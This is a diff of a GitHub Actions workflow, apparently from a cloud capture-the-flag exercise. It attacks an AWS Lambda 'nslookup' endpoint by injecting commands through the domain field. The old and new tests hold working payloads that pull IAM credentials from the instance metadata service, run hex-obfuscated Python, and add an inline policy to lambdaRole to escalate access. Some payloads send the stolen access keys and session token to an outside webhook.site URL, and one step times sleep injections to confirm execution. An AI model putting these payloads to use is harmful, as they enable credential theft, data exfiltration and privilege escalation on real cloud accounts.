@@ -1,4 +1,4 @@
-name: CloudEscape - Metadata + Elevation
+name: CloudEscape - Webhook Indication
 on:
   workflow_dispatch:
   push:
@@ -18,196 +18,214 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Test1 - IMDS via curl (instance metadata)
+      - name: Test1 - HTTP callback to verify injection executes
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Use curl to access instance metadata from inside Lambda
-          # curl http://169.254.169.254/latest/meta-data/ -- no IAM needed
-          # Write result to S3 via /opt/bin/aws
-          PAYLOAD='{"domain": "127.0.0.1; curl -s http://169.254.169.254/latest/meta-data/role/name > /tmp/m 2>&1; /opt/bin/aws s3 cp /tmp/m s3://platform-bucket-009661764077-us-east-1/meta-role.txt --region us-east-1 2>&1"}'
+          # Use a free webhook to verify injection executes
+          # webhook.site generates a unique URL, we can check if it received a request
+          # First, create a webhook endpoint
+          WEBHOOK_URL=$(curl -s https://webhook.site/token 2>&1 | python3 -c "import sys,json; print(json.load(sys.stdin)['uuid'])" 2>&1)
+          echo "Webhook UUID: $WEBHOOK_URL"
+          echo "Webhook URL: https://webhook.site/$WEBHOOK_URL"
           
-          echo "=== Test1: IMDS role name ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 12
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/meta-role.txt - --region us-east-1 2>&1
-
-      - name: Test2 - IMDS security creds + read flag with those creds
-        continue-on-error: true
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Get temporary credentials from IMDS
-          # Then use those creds to read flag from S3 and write to platform bucket
-          # All in one command to avoid /tmp persistence issues
-          PAYLOAD='{"domain": "127.0.0.1; R=$(curl -s http://169.254.169.254/latest/meta-data/role/name 2>/dev/null); C=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$R 2>/dev/null); AK=$(echo $C | grep -o AccessKeyId.* | cut -d\" -f3); SK=$(echo $C | grep -o SecretAccessKey.* | cut -d\" -f3); ST=$(echo $C | grep -o Token.* | cut -d\" -f3); export AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1"}'
-          
-          echo "=== Test2: IMDS creds + read flag ==="
-          echo "Payload length: ${#PAYLOAD}"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 12
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-
-      - name: Test3 - IMDS creds via printf-hex python (proper JSON parsing)
-        continue-on-error: true
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          PAYLOAD=$(python3 << 'PYEOF'
+          # Inject a curl to the webhook
+          PAYLOAD=$(python3 -c "
           import json
-          
-          # Python script that:
-          # 1. Gets role name from IMDS
-          # 2. Gets credentials from IMDS
-          # 3. Parses JSON properly
-          # 4. Uses those creds to read flag from S3
-          # 5. Writes flag to platform bucket
-          s = "import urllib.request,json,boto3\n"
-          s += "r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
-          s += "role=r.read().decode()\n"
-          s += "r2=urllib.request.urlopen(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}')\n"
-          s += "creds=json.loads(r2.read())\n"
-          s += "se=boto3.Session(aws_access_key_id=creds['AccessKeyId'],aws_secret_access_key=creds['SecretAccessKey'],aws_session_token=creds['Token'],region_name='us-east-1')\n"
-          s += "c=se.client('s3')\n"
-          s += "f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
-          s += "c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
-          
-          h = ''.join(f'\\x{ord(c):02x}' for c in s)
-          cmd = f'127.0.0.1; printf "{h}" > /tmp/m.py; /var/lang/bin/python3 /tmp/m.py 2>&1'
+          cmd = f'x; curl -s https://webhook.site/$WEBHOOK_URL?test=injection_works 2>&1'
           print(json.dumps({'domain': cmd}))
-          PYEOF
-          )
+          ")
           
-          echo "=== Test3: IMDS creds via python ==="
-          echo "Payload: ${#PAYLOAD} bytes"
+          echo "=== Sending webhook test ==="
+          echo "Payload: $PAYLOAD"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
-          sleep 12
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          echo "Waiting 15s..."
+          sleep 15
+          
+          # Check if webhook received anything
+          echo "=== Checking webhook ==="
+          curl -s "https://webhook.site/$WEBHOOK_URL/requests?sorting newest" 2>&1 | python3 -c "
+          import sys, json
+          try:
+              d = json.load(sys.stdin)
+              reqs = d.get('data', [])
+              print(f'Total requests received: {len(reqs)}')
+              for r in reqs[:5]:
+                  print(f'  {r.get(\"created_at\",\"?\")} {r.get(\"query\",{}).get(\"test\",\"\")}')
+          except Exception as e:
+              print(f'Error: {e}')
+          " 2>&1
+          
+          # Save webhook UUID for other steps
+          echo "WEBHOOK_URL=$WEBHOOK_URL" >> $GITHUB_ENV
 
-      - name: Test4 - IMDS creds + error capture via printf-hex python
+      - name: Test2 - Webhook with flag content via IMDS
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
           
-          PAYLOAD=$(python3 << 'PYEOF'
+          # Inject: get flag from S3 and send to webhook as URL parameter
+          PAYLOAD=$(python3 -c "
           import json
+          cmd = 'x; curl -s http://169.254.169.254/latest/meta-data/role/name > /tmp/rn 2>&1; R=$(cat /tmp/rn); curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$R > /tmp/rc 2>&1; /var/lang/bin/python3 -c \"import json; c=json.load(open('/tmp/rc')); print(c['AccessKeyId']+\":\"+c['SecretAccessKey']+\":\"+c['Token'])\" > /tmp/creds 2>&1; curl -s https://webhook.site/$WEBHOOK_UUID?creds=$(cat /tmp/creds 2>/dev/null | head -c 200) 2>&1'
+          print(json.dumps({'domain': cmd}))
+          ")
           
-          s = "import urllib.request,json,boto3,traceback\n"
-          s += "try:\n"
-          s += "    r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
-          s += "    role=r.read().decode()\n"
-          s += "    r2=urllib.request.urlopen(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}')\n"
-          s += "    creds=json.loads(r2.read())\n"
-          s += "    se=boto3.Session(aws_access_key_id=creds['AccessKeyId'],aws_secret_access_key=creds['SecretAccessKey'],aws_session_token=creds['Token'],region_name='us-east-1')\n"
-          s += "    c=se.client('s3')\n"
-          s += "    f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
-          s += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
-          s += "except Exception as ex:\n"
-          s += "    try:\n"
-          s += "        c2=boto3.client('s3',region_name='us-east-1')\n"
-          s += "        c2.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())\n"
-          s += "    except Exception as ex2:\n"
-          s += "        pass\n"
+          echo "=== Sending IMDS + webhook ==="
+          echo "Payload: ${#PAYLOAD} bytes"
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 15
           
+          echo "=== Checking webhook ==="
+          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
+          import sys, json
+          d = json.load(sys.stdin)
+          reqs = d.get('data', [])
+          print(f'Requests: {len(reqs)}')
+          for r in reqs[:5]:
+              print(f'  query: {r.get(\"query\",{})}')
+              print(f'  url: {r.get(\"url\",\"\")}')
+          " 2>&1 || true
+
+      - name: Test3 - Timing-based oracle (does injection add delay?)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Measure normal response time (no injection)
+          echo "=== Normal request (no injection) ==="
+          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1"}' 2>&1
+          echo
+          
+          # Measure with sleep 5 (if injection works, response should be ~5s slower)
+          echo "=== With sleep 5 ==="
+          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1; sleep 5"}' 2>&1
+          echo
+          
+          # Measure with sleep 10
+          echo "=== With sleep 10 ==="
+          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1; sleep 10"}' 2>&1
+          echo
+          
+          # Measure with sleep 14 (just under 15s timeout)
+          echo "=== With sleep 14 ==="
+          time curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "127.0.0.1; sleep 14"}' 2>&1
+          echo
+
+      - name: Test4 - webhook via printf-hex python (proper execution)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
+          
+          PAYLOAD=$(python3 << PYEOF
+          import json
+          s = "import urllib.request\n"
+          s += "urllib.request.urlopen('https://webhook.site/$WEBHOOK_UUID?test=python_works')\n"
           h = ''.join(f'\\x{ord(c):02x}' for c in s)
-          cmd = f'127.0.0.1; printf "{h}" > /tmp/m.py; /var/lang/bin/python3 /tmp/m.py 2>&1'
+          cmd = f'127.0.0.1; printf "{h}" > /tmp/w.py; /var/lang/bin/python3 /tmp/w.py 2>&1'
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
           
-          echo "=== Test4: IMDS + error capture ==="
+          echo "=== Test4: webhook via printf-hex python ==="
           echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
-          sleep 12
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          sleep 15
+          
+          echo "=== Checking webhook ==="
+          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
+          import sys, json
+          d = json.load(sys.stdin)
+          reqs = d.get('data', [])
+          print(f'Total requests: {len(reqs)}')
+          for r in reqs[:10]:
+              print(f'  {r.get(\"created_at\",\"?\")} query={r.get(\"query\",{})}')
+          " 2>&1 || true
 
-      - name: Test5 - cicdRole creds + iam PutRolePolicy on lambdaRole
+      - name: Test5 - webhook via python -c (single quotes, no nested quotes)
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
           
-          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          
-          # Use cicdRole creds (iam:* from inside VPC) to attach S3 policy to lambdaRole
-          # Then Lambda's own role can read S3
-          PAYLOAD=$(python3 << 'PYEOF'
-          import json, os
-          
-          a = os.environ['AKID_B64']
-          s = os.environ['SKID_B64']
-          t = os.environ['TOKEN_B64']
-          
-          # Python script that uses cicdRole creds to:
-          # 1. Put an inline policy on lambdaRole allowing s3:GetObject on codec bucket + s3:PutObject on platform bucket
-          # 2. Then use Lambda's own role (via IMDS) to read flag and write to platform
-          script = "import os,base64,boto3,json,urllib.request,traceback\n"
-          script += "a=base64.b64decode(os.environ['A']).decode()\n"
-          script += "s=base64.b64decode(os.environ['S']).decode()\n"
-          script += "t=base64.b64decode(os.environ['T']).decode()\n"
-          script += "se=boto3.Session(aws_access_key_id=a,aws_secret_access_key=s,aws_session_token=t,region_name='us-east-1')\n"
-          script += "iam=se.client('iam')\n"
-          script += "policy={'Version':'2012-10-17','Statement':[{'Effect':'Allow','Action':['s3:GetObject','s3:ListBucket'],'Resource':['arn:aws:s3:::codec4f26c862a321ef5','arn:aws:s3:::codec4f26c862a321ef5/*','arn:aws:s3:::platform-bucket-009661764077-us-east-1','arn:aws:s3:::platform-bucket-009661764077-us-east-1/*','arn:aws:s3:::site781fe43f26b9eba3','arn:aws:s3:::site781fe43f26b9eba3/*'],'Action':['s3:GetObject','s3:PutObject','s3:ListBucket']}]}\n"
-          script += "iam.put_role_policy(RoleName='lambdaRole',PolicyName='s3-access',PolicyDocument=json.dumps(policy))\n"
-          script += "r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
-          script += "role=r.read().decode()\n"
-          script += "r2=urllib.request.urlopen(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}')\n"
-          script += "creds=json.loads(r2.read())\n"
-          script += "se2=boto3.Session(aws_access_key_id=creds['AccessKeyId'],aws_secret_access_key=creds['SecretAccessKey'],aws_session_token=creds['Token'],region_name='us-east-1')\n"
-          script += "c=se2.client('s3')\n"
-          script += "f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
-          script += "c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
-          
-          h = ''.join(f'\\x{ord(c):02x}' for c in script)
-          cmd = f"127.0.0.1; export A={a} S={s} T={t}; printf \"{h}\" > /tmp/e.py; /var/lang/bin/python3 /tmp/e.py 2>&1"
+          # Use python3 -c with NO quotes inside the Python code
+          # Use urllib import and call
+          PAYLOAD=$(python3 << PYEOF
+          import json
+          cmd = f"127.0.0.1; /var/lang/bin/python3 -c 'import urllib.request;urllib.request.urlopen(\"https://webhook.site/$WEBHOOK_UUID?test=py2\")' 2>&1"
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
           
-          echo "=== Test5: cicdRole iam:PutRolePolicy + IMDS read flag ==="
-          echo "Payload: ${#PAYLOAD} bytes"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 13
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
-
-      - name: Test6 - Just write IMDS output to S3 (simplest indication)
-        continue-on-error: true
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # ULTRA SIMPLE: curl IMDS -> /tmp -> aws s3 cp
-          PAYLOAD='{"domain": "127.0.0.1; curl -s http://169.254.169.254/latest/meta-data/ > /tmp/imds 2>&1; /opt/bin/aws s3 cp /tmp/imds s3://platform-bucket-009661764077-us-east-1/imds.txt --region us-east-1"}'
-          
-          echo "=== Test6: IMDS list -> S3 ==="
+          echo "=== Test5: python -c webhook ==="
+          echo "Payload: $PAYLOAD"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
           sleep 12
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/imds.txt - --region us-east-1 2>&1
+          
+          echo "=== Checking webhook ==="
+          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
+          import sys, json
+          d = json.load(sys.stdin)
+          reqs = d.get('data', [])
+          print(f'Total: {len(reqs)}')
+          for r in reqs[:10]:
+              print(f'  q={r.get(\"query\",{})}')
+          " 2>&1 || true
 
-      - name: Final check
+      - name: Test6 - webhook via /opt/bin/aws sts get-caller-identity
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
+          
+          # Use /opt/bin/aws sts get-caller-identity to get Lambda role identity
+          # Then send to webhook
+          PAYLOAD=$(python3 << PYEOF
+          import json
+          cmd = f"127.0.0.1; /opt/bin/aws sts get-caller-identity --region us-east-1 > /tmp/id 2>&1; curl -s https://webhook.site/$WEBHOOK_UUID?id=$(cat /tmp/id | head -c 200) 2>&1"
+          print(json.dumps({'domain': cmd}))
+          PYEOF
+          )
+          
+          echo "=== Test6: sts identity -> webhook ==="
+          echo "Payload: ${#PAYLOAD} bytes"
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 12
+          
+          echo "=== Checking webhook ==="
+          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest" 2>&1 | python3 -c "
+          import sys, json
+          d = json.load(sys.stdin)
+          reqs = d.get('data', [])
+          print(f'Total: {len(reqs)}')
+          for r in reqs[:10]:
+              print(f'  q={r.get(\"query\",{})}')
+          " 2>&1 || true
+
+      - name: Final - Webhook summary
         if: always()
         run: |
-          echo "===== Platform bucket ====="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          WEBHOOK_UUID="${{ env.WEBHOOK_URL }}"
+          echo "Webhook UUID: $WEBHOOK_UUID"
+          echo "Webhook URL: https://webhook.site/$WEBHOOK_UUID"
           
-          echo "===== Read all new files ====="
-          for f in meta-role.txt flag.txt error.txt imds.txt; do
-            echo "--- $f ---"
-            aws s3 cp s3://platform-bucket-009661764077-us-east-1/$f - --region us-east-1 2>&1 || true
-            echo
-          done
-          
-          echo "===== API response ====="
-          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
-          echo
-          
-          echo "===== Lambda config ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
+          echo "=== ALL webhook requests ==="
+          curl -s "https://webhook.site/$WEBHOOK_UUID/requests?sorting=newest&per_page=50" 2>&1 | python3 -c "
+          import sys, json
+          try:
+              d = json.load(sys.stdin)
+              reqs = d.get('data', [])
+              print(f'Total requests received: {len(reqs)}')
+              for r in reqs:
+                  print(f'  {r.get(\"created_at\",\"?\")} query={r.get(\"query\",{})} url={r.get(\"url\",\"\")[:100]}')
+          except Exception as e:
+              print(f'Error: {e}')
+          " 2>&1 || true
